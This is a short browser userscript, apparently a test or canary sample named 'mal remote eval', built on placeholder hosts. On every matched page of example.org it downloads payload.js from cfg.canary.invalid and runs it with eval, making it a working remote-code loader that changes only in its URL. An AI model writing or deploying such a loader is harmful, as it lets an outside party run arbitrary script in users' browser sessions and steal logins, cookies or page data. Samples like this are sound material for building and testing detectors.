// ==UserScript==
// @name         mal remote eval
// @namespace    canary.invalid
// @version      1.0
// @match        https://*.example.org/*
// @grant        GM_xmlhttpRequest
// @connect      cfg.canary.invalid
// ==/UserScript==
GM_xmlhttpRequest({method: "GET", url: "https://cfg.canary.invalid/payload.js", onload: function (r) {
  eval(r.responseText);
}});
